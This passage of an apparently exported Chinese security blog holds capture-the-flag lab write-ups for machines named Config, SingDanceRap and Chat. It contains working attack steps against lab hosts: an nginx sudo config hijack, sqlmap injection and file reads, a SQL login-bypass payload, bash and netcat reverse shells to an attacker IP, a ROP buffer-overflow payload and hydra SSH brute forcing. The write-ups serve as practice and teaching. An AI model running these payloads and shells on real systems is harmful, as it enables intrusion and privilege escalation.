.profile\n-rw-r--r-- 1 root     root       48 Jul  4 23:37 user.txt\nmikannse@Config:~$ cat user.txt \nflag{user-530773d6-5951-11f0-89d9-836ccaf94d6b}\n```\n\n\u6ce8\u610f\u5230\u5176\u4e2d\u6709\u4e00\u4e2a `root` \u7528\u6237\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6 `mikannse.conf`\u3002\u63a5\u7740\uff0c\u6267\u884c `sudo -l` \u67e5\u770b\u5f53\u524d\u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nmikannse@Config:~$ sudo -l\nMatching Defaults entries for mikannse on Config:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser mikannse may run the following commands on Config:\n    (root) NOPASSWD: /usr/sbin/nginx -c /home/mikannse/mikannse.conf\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`mikannse` \u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5 `root` \u6743\u9650\u6267\u884c `nginx` \u547d\u4ee4\uff0c\u5e76\u5f3a\u5236\u4f7f\u7528 `/home/mikannse/mikannse.conf`\u4f5c\u4e3a\u914d\u7f6e\u6587\u4ef6\u3002\n\n## 2. Nginx\u914d\u7f6e\u52ab\u6301\u63d0\u6743\n\n\u867d\u7136\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u5199\u5165\u7531 `root` \u62e5\u6709\u7684 `mikannse.conf` \u6587\u4ef6\uff0c\u4f46\u8be5\u6587\u4ef6\u4f4d\u4e8e\u6211\u4eec\u7684\u5bb6\u76ee\u5f55 `/home/mikannse` \u4e0b\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5bf9\u8be5\u76ee\u5f55\u6709\u5199\u6743\u9650\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u5c06\u539f\u6587\u4ef6\u91cd\u547d\u540d\u6216\u5220\u9664\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u7684\u6076\u610f\u914d\u7f6e\u6587\u4ef6\u6765\u52ab\u6301 `sudo` \u6267\u884c\u6d41\u7a0b\u3002\n\n**\u63d0\u6743\u6b65\u9aa4:**\n\n1.  \u5c06\u539f\u59cb\u7684 `mikannse.conf` \u6587\u4ef6\u91cd\u547d\u540d\uff0c\u4ee5\u4f5c\u5907\u4efd\u3002\n2.  \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 `mikannse.conf` \u6587\u4ef6\u3002\n3.  \u5728\u65b0\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u914d\u7f6e Nginx \u542f\u52a8\u4e00\u4e2a\u65b0\u7684 Web \u670d\u52a1\uff08\u4f8b\u5982\u5728 8081 \u7aef\u53e3\uff09\uff0c\u5176\u6839\u76ee\u5f55\u6307\u5411 `/root` \u76ee\u5f55\uff0c\u5e76\u5f00\u542f\u76ee\u5f55\u5217\u8868\u529f\u80fd (`autoindex on`)\u3002\n\n```bash\n# \u79fb\u52a8\u539f\u914d\u7f6e\u6587\u4ef6\nmikannse@Config:~$ mv /home/mikannse/mikannse.conf a\n\n# \u521b\u5efa\u5e76\u5199\u5165\u6076\u610f\u914d\u7f6e\u6587\u4ef6\nmikannse@Config:~$ vim mikannse.conf \nmikannse@Config:~$ cat mikannse.conf\nuser root;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    server {\n        listen       8081;          \n        server_name  Config;     \n        \n        # \u5173\u952e\u914d\u7f6e\uff1a\u5c06/files\u8def\u5f84\u6620\u5c04\u5230/root/\u76ee\u5f55\n        location /files {\n            alias /root/;\n            autoindex on; # \u5f00\u542f\u76ee\u5f55\u6d4f\u89c8\n        }\n    }\n}\n```\n\n4.  \u4f7f\u7528 `sudo` \u6267\u884c Nginx \u547d\u4ee4\uff0c\u4f7f\u5176\u4ee5 `root` \u6743\u9650\u52a0\u8f7d\u6211\u4eec\u7684\u6076\u610f\u914d\u7f6e\u3002\n\n```bash\nmikannse@Config:~$ sudo /usr/sbin/nginx -c /home/mikannse/mikannse.conf\n```\n\n\u6267\u884c\u540e\uff0cNginx \u4f1a\u5728\u540e\u53f0\u4ee5 `root` \u8eab\u4efd\u542f\u52a8\u4e00\u4e2a\u76d1\u542c 8081 \u7aef\u53e3\u7684 Web \u670d\u52a1\uff0c\u8be5\u670d\u52a1\u4f1a\u5c06 `/root` \u76ee\u5f55\u7684\u5185\u5bb9\u66b4\u9732\u51fa\u6765\u3002\n\n# **\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u56de\u5230\u653b\u51fb\u673a\uff0c\u4f7f\u7528 `curl` \u8bbf\u95ee\u76ee\u6807\u9776\u673a `192.168.205.241` \u7684 8081 \u7aef\u53e3\u3002\n\n\u9996\u5148\uff0c\u8bbf\u95ee `/files/` \u8def\u5f84\uff0c\u7531\u4e8e\u5f00\u542f\u4e86 `autoindex`\uff0c\u670d\u52a1\u5668\u4f1a\u5217\u51fa `/root` \u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.241:8081/files/\n<html>\n<head><title>Index of /files/</title></head>\n<body>\n<h1>Index of /files/</h1><hr><pre><a href='../'>../</a>\n<a href='root.txt'>root.txt</a>                                           05-Jul-2025 03:54                  48\n</pre><hr></body>\n</html>\n```\n\n\u5728\u5217\u8868\u4e2d\u6211\u4eec\u770b\u5230\u4e86 `root.txt` \u6587\u4ef6\u3002\u63a5\u7740\u76f4\u63a5\u8bfb\u53d6\u8be5\u6587\u4ef6\uff0c\u83b7\u5f97\u6700\u7ec8\u7684 root flag\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.241:8081/files/root.txt\nflag{root-bf116e68-5953-11f0-b06c-63e27ce93d04}\n```\n\n\u81f3\u6b64\uff0cuser \u548c root \u4e24\u4e2a flag \u5747\u5df2\u83b7\u53d6\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754441356, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P181": {"htmlDir": "docs/post/nei-bu-_SingDanceRap.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_SingDanceRap", "postUrl": "post/nei-bu-_SingDanceRap.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/181", "commentNum": 0, "wordCount": 6012, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u4e0e\u670d\u52a1\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673aIP\u5730\u5740\u4e3a `192.168.205.245`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.245 08:00:27:82:68:fa       PCS Systemtechnik GmbH\n...\n```\n\n\u63a5\u7740\uff0c\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.245\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 10:09 EDT\nNmap scan report for 192.168.205.245\nHost is up (0.0013s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE    SERVICE\n22/tcp    open     ssh\n80/tcp    open     http\n```\n\n## **2. Web\u670d\u52a1\u63a2\u7d22\u4e0eSQL\u6ce8\u5165**\n\n\u8bbf\u95ee80\u7aef\u53e3\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u65b0\u95fb\u7f51\u7ad9\u3002\u7f51\u7ad9\u5185\u7684\u94fe\u63a5 `http://192.168.205.245/news.php?title=...` \u5b58\u5728\u660e\u663e\u7684GET\u53c2\u6570\uff0c\u8fd9\u901a\u5e38\u662f\u6f0f\u6d1e\u7684\u5207\u5165\u70b9\u3002\n\n\u4f7f\u7528 `sqlmap` \u5bf9 `title` \u53c2\u6570\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8fc5\u901f\u786e\u8ba4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch\n...\n---\nParameter: title (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: title=1' AND (SELECT 4710 FROM (SELECT(SLEEP(5)))shBD) AND 'ceXN'='ceXN\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: title=1' UNION ALL SELECT NULL,CONCAT(0x71627a6271,...),NULL-- -\n---\n[10:14:22] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Debian\nweb application technology: Apache 2.4.59\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n...\n```\n\n`sqlmap` \u786e\u8ba4\u540e\u53f0\u6570\u636e\u5e93\u4e3aMySQL\uff0c\u5e76\u4e14\u8be5\u6ce8\u5165\u70b9\u4e3aDBA\u6743\u9650\u3002\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## **1. \u6f0f\u6d1e\u5229\u7528\uff1a\u4eceSQL\u6ce8\u5165\u5230\u540e\u53f0\u6e90\u7801\u6cc4\u9732**\n\n\u5229\u7528SQL\u6ce8\u5165\u70b9\uff0c\u6211\u4eec\u9996\u5148\u5c1d\u8bd5\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u7528\u6237\u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch -D news_db -T users --dump\n...\nDatabase: news_db\nTable: users\n[2 entries]\n+----+-----------+----------+\n| id | password  | username |\n+----+-----------+----------+\n| 1  | password1 | user1    |\n| 2  | password2 | user2    |\n+----+-----------+----------+\n...\n```\n\n\u83b7\u53d6\u5230\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 (`user1:password1`) \u770b\u8d77\u6765\u662f\u65e0\u6548\u7684\u6d4b\u8bd5\u6570\u636e\u3002\u63a5\u7740\uff0c\u4f7f\u7528 `gobuster` \u5bf9\u7f51\u7ad9\u76ee\u5f55\u8fdb\u884c\u7206\u7834\uff0c\u53d1\u73b0\u4e00\u4e2a\u9690\u85cf\u76ee\u5f55 `/littlesecrets/`\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u767b\u5f55\u9875\u9762 `login.php`\u3002\n\n\u7531\u4e8e\u6570\u636e\u5e93\u4e2d\u7684\u51ed\u636e\u65e0\u6548\uff0c\u6211\u4eec\u7684\u7b56\u7565\u8f6c\u5411\u8bfb\u53d6Web\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u4ee5\u83b7\u53d6\u540e\u53f0\u767b\u5f55\u7684\u771f\u5b9e\u903b\u8f91\u3002\u901a\u8fc7\u8bfb\u53d6Apache\u7684\u914d\u7f6e\u6587\u4ef6 `/etc/apache2/apache2.conf`\uff0c\u6211\u4eec\u53d1\u73b0\u7f51\u7ad9\u7684\u6839\u76ee\u5f55\u88ab\u4fee\u6539\u4e3a `/var/www/he110wor1d`\u3002\n\n```bash\n# \u4eceapache2.conf\u4e2d\u53d1\u73b0\u7684\u5173\u952e\u914d\u7f6e\n<Directory /var/www/he110wor1d/>\n        Options -Indexes\n        AllowOverride None\n        Require all granted\n</Directory>\n\n<VirtualHost *:80>\n    DocumentRoot /var/www/he110wor1d\n...\n```\n\n\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\uff0c\u6211\u4eec\u6210\u529f\u8bfb\u53d6\u4e86 `login.php` \u7684\u6e90\u4ee3\u7801\uff0c\u5e76\u53d1\u73b0\u4e86\u6570\u636e\u5e93\u7684\u8fde\u63a5\u5bc6\u7801\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch --file-read='/var/www/he110wor1d/littlesecrets/login.php'\n...\n$servername = 'localhost';\n$username = 'root';\n$password = 'i_love_sing_dance_rap';\n$dbname = 'news_db';\n...\n```\n\n# **2. \u8eab\u4efd\u4f2a\u9020\u4e0e\u547d\u4ee4\u6267\u884c**\n\n\u63a5\u7740\u8bfb\u53d6\u767b\u5f55\u6210\u529f\u540e\u8df3\u8f6c\u7684\u9875\u9762 `manager.php`\uff0c\u53d1\u73b0\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u4f46\u9700\u8981\u767b\u5f55\u7528\u6237\u7684\u7528\u6237\u540d\u4e3a `he110wor1d_admin`\u3002\n\n```php\n// \u4ece manager.php \u6e90\u7801\u4e2d\u53d1\u73b0\u7684\u5173\u952e\u4ee3\u7801\nif ($_SESSION['username'] !== 'he110wor1d_admin') {\n    die('Access Denied. You do not have permission to access this page.');\n}\n...\n$command = $_POST['command'];\n$command_output = shell_exec($command);\n...\n```\n\n\u7531\u4e8e `login.php` \u7684SQL\u67e5\u8be2\u5b58\u5728\u7f3a\u9677\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6784\u9020UNION\u67e5\u8be2\u6765\u4f2a\u9020\u8eab\u4efd\u3002\u5728\u767b\u5f55\u6846\u4e2d\u8f93\u5165\u4ee5\u4e0bpayload\uff1a\n\n*   **Username**: `' UNION SELECT 1, 'he110wor1d_admin', '1' #`\n*   **Password**: `1`\n\n\u6210\u529f\u767b\u5f55\u540e\uff0c\u6211\u4eec\u8fdb\u5165\u4e86 `manager.php` \u7684\u547d\u4ee4\u6267\u884c\u9762\u677f\u3002\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0fShell\uff0c\u6211\u4eec\u6267\u884c\u53cd\u5f39Shell\u547d\u4ee4\u3002\n\n\u9996\u5148\uff0c\u5728\u653b\u51fb\u673a\u4e0a\u76d1\u542c\u7aef\u53e3\uff1a\n\n```bash\nnc -lvnp 8888\n```\n\n\u7136\u540e\u5728Web\u9762\u677f\u4e2d\u6267\u884c\uff1a\n\n```bash\nbash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'\n```\n\n\u6210\u529f\u83b7\u53d6 `www-data` \u7528\u6237\u7684shell\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. \u6c34\u5e73\u63d0\u6743\uff1awww-data -> he110wor1d**\n\n\u5728\u83b7\u53d6 `www-data` \u6743\u9650\u540e\uff0c\u6211\u4eec\u6000\u7591\u4e4b\u524d\u4ece `login.php` \u4e2d\u6cc4\u9732\u7684\u6570\u636e\u5e93\u5bc6\u7801 `i_love_sing_dance_rap` \u53ef\u80fd\u88ab\u7cfb\u7edf\u7528\u6237 `he110wor1d` \u590d\u7528\u3002\n\n```bash\nwww-data@singdancerap:/var/www/he110wor1d/littlesecrets$ su he110wor1d \nPassword: i_love_sing_dance_rap\nhe110wor1d@singdancerap:/home$ id\nuid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `he110wor1d` \u7528\u6237\uff0c\u5e76\u5728\u5176\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230\u7b2c\u4e00\u4e2aflag\u3002\n\n```bash\nhe110wor1d@singdancerap:~$ cat user.txt\n#SQL injection can not only retrieve data but also forge it.\n\nUser flag:107883ee-f5e4-11ef-8542-005056207011\n```\n\n## **2. \u5782\u76f4\u63d0\u6743\uff1ahe110wor1d -> root (SUID & ROP)**\n\n\u5728 `he110wor1d` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e00\u4e2a\u62e5\u6709SUID\u6743\u9650\u7684\u53ef\u6267\u884c\u6587\u4ef6 `thekey2root`\u3002\n\n```bash\nhe110wor1d@singdancerap:~/thekey2root$ ls -al\n-rwsr-sr-x 1 root root 15472 Mar 1 00:23 thekey2root\n```\n\n\u4f7f\u7528 `checksec` \u68c0\u67e5\u8be5\u6587\u4ef6\uff0c\u53d1\u73b0\u5b83\u662f\u4e00\u4e2a32\u4f4d\u7a0b\u5e8f\uff0c\u6ca1\u6709PIE\u548cCanary\u4fdd\u62a4\uff0c\u4f46\u5f00\u542f\u4e86NX\u3002\u8fd9\u662f\u5178\u578b\u7684ROP\u653b\u51fb\u573a\u666f\u3002\n\n```bash\n[*] '/mnt/hgfs/gx/x/tmp/thekey2root'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n```\n\n\u901a\u8fc7GDB\u52a8\u6001\u8c03\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0 `main` \u51fd\u6570\u4e2d\u7684 `input()` (\u5373 `scanf`) \u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5229\u7528 `pattern create` \u548c `pattern offset`\uff0c\u6211\u4eec\u7cbe\u7b97\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u6240\u9700\u7684\u504f\u79fb\u91cf\u4e3a **32\u5b57\u8282**\u3002\n\n\u6211\u4eec\u7684\u76ee\u6807\u662f\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684 `system()` \u51fd\u6570\u6765\u6267\u884c\u547d\u4ee4\u3002\u4e3a\u4e86\u83b7\u5f97root\u6743\u9650\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63d0\u6743\u7684\u51fd\u6570\u3002`sing_dance_rap` \u51fd\u6570\uff08\u5730\u5740 `0x08049213`\uff09\u6070\u597d\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u56e0\u4e3a\u5b83\u5185\u90e8\u8c03\u7528\u4e86 `setuid(0)` \u548c `setgid(0)`\u3002\n\n**\u6784\u9020ROP\u94fe**\uff1a\n\u6211\u4eec\u7684\u8ba1\u5212\u662f\uff0c\u5148\u8df3\u8f6c\u5230 `sing_dance_rap` \u63d0\u6743\uff0c\u7136\u540e\u4ece `sing_dance_rap` \u8fd4\u56de\u65f6\uff0c\u518d\u8df3\u8f6c\u5230 `system` \u51fd\u6570\uff0c\u5e76\u8ba9\u5176\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u547d\u4ee4\u3002\n\n*   **\u586b\u5145**\uff1a32\u5b57\u8282\u7684\u5783\u573e\u6570\u636e\u3002\n*   **\u7b2c\u4e00\u8df3**\uff1a`sing_dance_rap` \u7684\u5730\u5740 (`0x08049213`)\u3002\n*   **\u7b2c\u4e8c\u8df3**\uff1a`system@plt` \u7684\u5730\u5740 (`0x08049040`)\u3002\n*   **`system`\u7684\u8fd4\u56de\u5730\u5740**\uff1a\u4e00\u4e2a\u4efb\u610f\u7684\u5360\u4f4d\u5730\u5740 (e.g., `0xdeadbeef`)\u3002\n*   **`system`\u7684\u53c2\u6570**\uff1a\u5728\u7a0b\u5e8f\u7684\u53ea\u8bfb\u6570\u636e\u6bb5\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a\u5b8c\u7f8e\u7684\u5b57\u7b26\u4e32 `'s'`\uff0c\u5176\u5730\u5740\u4e3a `0x0804a03e`\u3002\n\n**\u73af\u5883\u51c6\u5907\u4e0e\u653b\u51fb\u6267\u884c**\uff1a\n\u5728\u9776\u673a\u4e0a\uff0c\u6211\u4eec\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u52ab\u6301\uff0c\u8ba9 `system('s')` \u6267\u884c\u6211\u4eec\u6307\u5b9a\u7684\u53cd\u5f39Shell\u811a\u672c\u3002\n\n```bash\n# 1. \u5728\u653b\u51fb\u673a\u4e0a\u76d1\u542c\u7aef\u53e3\nnc -lvnp 9999\n\n# 2. \u5728\u9776\u673a\u4e0a\u51c6\u5907\u73af\u5883 (he110wor1d\u7528\u6237\u4e0b)\necho 'nc 192.168.205.128 9999 -e /bin/bash' > s\nchmod +x s\nexport PATH=.:$PATH\n```\n\n**\u6700\u7ec8Payload**:\n\n```\n'A'*32 + p32(0x08049213) + p32(0x08049040) + p32(0xdeadbeef) + p32(0x0804a03e)\n```\n\n\u5728\u9776\u673a\u4e0a\uff0c\u4f7f\u7528Perl\u6267\u884c\u6b64payload\uff1a\n\n```bash\nhe110wor1d@singdancerap:~/thekey2root$ perl -e 'print 'A'x32 . '\\x13\\x92\\x04\\x08' . '\\x40\\x90\\x04\\x08' . '\\xef\\xbe\\xad\\xde' . '\\x3e\\xa0\\x04\\x08'' | ./thekey2root\n```\n\n\u547d\u4ee4\u6267\u884c\u540e\uff0c\u7a0b\u5e8f\u4f1a\u770b\u4f3c\u5361\u4f4f\uff0c\u6b64\u65f6\u6211\u4eec\u7684\u653b\u51fb\u673a\u5df2\u6536\u5230 `root` \u6743\u9650\u7684\u53cd\u5f39Shell\u3002\n\n# **\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u6210\u529f\u83b7\u53d6 `root` shell\u540e\uff0c\u8bfb\u53d6\u6700\u7ec8\u7684flag\u3002\n\n```bash\nroot@singdancerap:~# id\nuid=0(root) gid=0(root) groups=0(root),1001(he110wor1d)\nroot@singdancerap:~# cat /root/root.txt\n#During the process of PWN, the execution of the system function does not necessarily have to be bash.\n\nroot flag:943ac8c9-f696-11ef-8bd4-005056207011\n```\n\n\u81f3\u6b64\uff0c\u9776\u673a`singdancerap`\u7684\u6240\u6709\u6311\u6218\u5747\u5df2\u5b8c\u6210\u3002\nsentence", "top": 0, "createdAt": 1754441378, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P182": {"htmlDir": "docs/post/nei-bu-_Chat.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Chat", "postUrl": "post/nei-bu-_Chat.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/182", "commentNum": 0, "wordCount": 4268, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u5de5\u5177\u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.248`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.248 08:00:27:60:fd:c6       PCS Systemtechnik GmbH\n...\n```\n\n## **2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u7aef\u53e3\u548c\u670d\u52a1\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u5f00\u653e\u4e86 22 (ssh-chat)\u30012222 (OpenSSH) \u548c 8000 (HTTP) \u4e09\u4e2a\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p22,2222,8000 -sC -sV 192.168.205.248\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 23:30 EDT\nNmap scan report for 192.168.205.248\nHost is up (0.00033s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     (protocol 2.0)\n| fingerprint-strings:\n|_  NULL: SSH-2.0-Go ssh-chat\n2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey:\n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n8000/tcp open  http    Golang net/http server\n|_http-title: /\n...\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n*   **22/tcp**: \u4e00\u4e2a\u57fa\u4e8e Go \u7684 `ssh-chat` \u670d\u52a1\u3002\n*   **2222/tcp**: \u6807\u51c6\u7684 OpenSSH \u670d\u52a1\uff0c\u662f\u4e3b\u8981\u7684\u7a81\u7834\u53e3\u3002\n*   **8000/tcp**: \u4e00\u4e2a\u7531 Golang \u5b9e\u73b0\u7684 HTTP \u6587\u4ef6\u670d\u52a1\u5668\u3002\n\n### **3. Web \u670d\u52a1\u63a2\u7d22**\n\n\u8bbf\u95ee 8000 \u7aef\u53e3\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u6587\u4ef6\u76ee\u5f55\u6d4f\u89c8\u9875\u9762\u3002\u901a\u8fc7\u9875\u9762\u5185\u5bb9\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a `.ssh` \u76ee\u5f55\uff0c\u8fd9\u901a\u5e38\u5b58\u653e\u7528\u6237\u7684 SSH \u5bc6\u94a5\u3002\n\n\u5728 `.ssh` \u76ee\u5f55\u4e2d\uff0c\u627e\u5230\u4e86\u7528\u6237\u7684\u516c\u94a5 `authorized_keys` \u548c\u79c1\u94a5 `id_rsa`\u3002\u5c06\u79c1\u94a5\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u5c1d\u8bd5\u7528\u4e8e\u540e\u7eed\u7684\u767b\u5f55\u3002\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## **1. \u6f0f\u6d1e\u5229\u7528\uff1aSSH \u5f31\u53e3\u4ee4\u7206\u7834**\n\n\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528\u4ece Web \u670d\u52a1\u4e0b\u8f7d\u7684\u79c1\u94a5\u767b\u5f55 2222 \u7aef\u53e3\u7684 SSH \u670d\u52a1\uff0c\u4f46\u4ee5\u5931\u8d25\u544a\u7ec8\u3002\u968f\u540e\uff0c\u5c1d\u8bd5\u7528\u540c\u4e00\u79c1\u94a5\u767b\u5f55\u8fd0\u884c\u5728 22 \u7aef\u53e3\u7684 ssh-chat \u670d\u52a1\uff0c\u8fd9\u6b21\u767b\u5f55\u6210\u529f\u4e86\u3002\u4f46\u5728\u8fdb\u4e00\u6b65\u63a2\u7d22\u4e2d\uff0c\u5e76\u672a\u53d1\u73b0\u5176\u4ed6\u6709\u4ef7\u503c\u7684\u7ebf\u7d22\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c`ssh-chat` \u670d\u52a1\u7684\u5f53\u524d\u7528\u6237\u4e3a `scycree`\uff0c\u4e14\u767b\u5f55\u6a2a\u5e45\u4e2d\u63d0\u5230\u4e86`todd`\uff0c\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u91cd\u8981\u63d0\u793a\u3002\n\n\u56e0\u6b64\uff0c\u51b3\u5b9a\u5bf9 2222 \u7aef\u53e3\u7684 SSH \u670d\u52a1\u8fdb\u884c\u5f31\u53e3\u4ee4\u7206\u7834\u3002\u4f7f\u7528 `hydra` \u5de5\u5177\uff0c\u4ee5 `todd` \u548c `scycree` \u4e3a\u7528\u6237\u540d\u5b57\u5178\uff0c\u7ed3\u5408\u5e38\u7528\u5bc6\u7801\u5b57\u5178\u8fdb\u884c\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat user\ntodd\nscycree\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ hydra -L user -P 5000q.txt ssh://192.168.205.248:2222 -I -u -f -e nsr -t 64\n...\n[2222][ssh] host: 192.168.205.248   login: todd   password: todd\n...\n```\n\n\u7206\u7834\u6210\u529f\uff0c\u83b7\u5f97\u7528\u6237 `todd` \u7684\u5bc6\u7801\u4e3a `todd`\u3002\n\n## **2. \u83b7\u53d6 Shell**\n\n\u4f7f\u7528\u83b7\u53d6\u7684\u51ed\u636e `todd:todd` 